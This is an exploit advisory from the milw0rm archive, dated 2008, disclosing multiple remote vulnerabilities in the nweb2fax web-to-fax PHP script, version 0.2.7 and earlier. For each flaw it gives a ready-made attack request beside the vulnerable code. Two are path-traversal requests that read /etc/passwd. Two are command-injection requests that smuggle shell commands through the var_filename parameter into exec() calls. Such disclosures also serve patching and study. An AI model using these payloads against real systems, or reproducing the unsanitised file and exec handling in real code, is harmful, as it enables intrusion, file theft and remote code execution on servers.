<html><head><title>nweb2fax <= 0.2.7 Multiple Remote Vulnerabilities</title></head><pre>  :::::::-.   ...    ::::::.    :::.
   ;;,   `';, ;;     ;;;`;;;;,  `;;;
   `[[     [[[['     [[[  [[[[[. '[[
    $$,    $$$$      $$$  $$$ &quot;Y$c$$
    888_,o8P'88    .d888  888    Y88
    MMMMP&quot;`   &quot;YmmMMMM&quot;&quot;  MMM     YM

   [ Discovered by dun \ dun[at]strcpy.pl ]

 ##################################################################
 #  [  nweb2fax &lt;= 0.2.7   Multiple Remote Vulnerabilities  ]     #
 ##################################################################
 #
 # Script site:  http://sourceforge.net/projects/nweb2fax/
 # 
 # [ Local File Inclusion Vulnerability ]:
 #  *** /comm.php?id=../../../../../../../../../../etc/passwd
 #
 # Bug:
 #
 # ...
 # $var_id=$_GET['id'];
 # $fileary = file ( &quot;$DIR_SPOOL/log/c$var_id&quot; );
 # reset($fileary);
 # foreach ($fileary as $line) {
 # 	if( trim($line) != &quot;&quot; ){
 # 		print &quot;&lt;br&gt;$line&quot;;
 # 	}
 # }
 # ...
 #
 #
 # [ Arbitrary File Download Vulnerability ]:
 #
*** /viewrq.php?format=ps&amp;var_filename=../../../../../../../../../../etc/passwd
 #
 # Bug:
 #
 # ...
 # $var_filename=$_GET['var_filename'];
 # $var_format=$_GET['format'];
 # ...
 # if( $var_format == &quot;ps&quot; ) {
 #   $filename = &quot;$DIR_SPOOL/$var_filename&quot;;
 #   header(&quot;Content-Type: application/postscript&quot;);
 #   header('Content-Disposition: attachment;
filename=&quot;downloaded.ps&quot;');
 #   readfile(&quot;$filename&quot;);
 # ...
 #
 #
 # [ Remote Command Execution 1]:
 # *** /viewrq.php?format=tif&amp;var_filename=;id%3E/tmp/id.txt;chmod%
20777%20/tmp/id.txt;
 #
 # Bug:
 # ...
 # $var_filename=$_GET['var_filename'];
 # $var_format=$_GET['format'];
 # ...
 # } elseif ($var_format == &quot;pdf&quot;)  {
 # ...
 # $recvq_filename = &quot;$DIR_SPOOL/$var_filename&quot;;
 # ...
 # exec(&quot;$PROG_TIFF2PS -a -O $FILE_TMP1 $recvq_filename&quot;,$exec_output,
$exec_return);
 # ...
 # 
 #
 # [ Remote Command Execution 2]:
 # *** /viewrq.php?format=pdf&amp;var_filename=;id%3E/tmp/id2.txt;chmod%
20777%20/tmp/id2.txt;id
 #      
 # Bug:
 # ...
 # $var_filename=$_GET['var_filename'];
 # $var_format=$_GET['format'];
 # ...
 # } elseif ($var_format == &quot;pdf&quot;)  {
 # ...
 # $recvq_filename = &quot;$DIR_SPOOL/$var_filename&quot;;
 # ...
 #  $cmd=&quot;$PROG_CAT $recvq_filename | $PROG_GS $gs_options&quot;;
 # ...
 #  exec($cmd,$exec_output,$exec_return);
 # ...
 #
 #
 ###############################################
 # Greetz: D3m0n_DE * sid.psycho * str0ke and otherz..
 ###############################################

 [ dun / 2008 ] 

# milw0rm.com [2008-06-18]</pre></html>